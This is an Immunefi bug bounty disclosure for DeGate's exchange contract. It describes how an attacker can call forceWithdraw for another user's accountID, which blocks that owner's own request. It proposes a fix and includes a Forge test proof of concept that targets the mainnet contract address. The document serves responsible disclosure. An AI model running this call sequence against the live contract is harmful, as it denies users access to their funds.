# 25892 - \[SC - Insight] A malicious user can DoS force withdraw request...

Submitted on Nov 20th 2023 at 22:59:01 UTC by @CanYeRest298751 for [Boost | DeGate](https://immunefi.com/bounty/boosteddegatebugbounty/)

Report ID: #25892

Report type: Smart Contract

Report severity: Insight

Target: <https://etherscan.io/address/0x9C07A72177c5A05410cA338823e790876E79D73B#code>

Impacts:

* Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Bug Description

A malicious user can request a `forceWithdraw` request on behalf of another `accountID`. This is correctly handled by the prover, and the request will be invalidated when processed by the operator. However in the meantime, the user with the account `accountID` cannot request a forceWithdraw, since only one `forceWithdraw` can be requested at a time.

## Impact

A malicious user can prevent a legitimate one to request `forceWithdraw` for her funds. Thereby denying the access to funds if operator is also malicious. This can be used to keep big accounts inside the platform, and is a big centralization risk

## Risk Breakdown

Difficulty to Exploit: Easy Weakness: CVSS2 Score:

## Recommendation

Also include the `from` variable in the mapping to check if forceWithdraw has been requested, since `from` can be invalid at request time.

## References

## Proof of concept

import as a test in a forge project and run `forge test -vvvv`

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IExchangeV3 {
    function forceWithdraw(
        address from,
        address tokenId,
        uint32 accountId
    ) external payable;
}

contract CounterTest is Test {
    IExchangeV3 public exchangeV3 =
        IExchangeV3(0x9C07A72177c5A05410cA338823e790876E79D73B);

    address usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    address attacker = address(1);
    address legitimate_user = address(2);

    uint32 accountId = 1;

    function setUp() public {}

    function testForceWithdrawalDos() public {
        //This withdraw is bound to fail because accountId does not belong to address attacker
        vm.prank(attacker);
        exchangeV3.forceWithdraw{value: 1e18}(attacker, usdc, accountId);

        //This withdraw request can succeed, because this is the right value for from
        vm.prank(legitimate_user);
        exchangeV3.forceWithdraw{value: 1e18}(legitimate_user, usdc, accountId);
    }
}
```
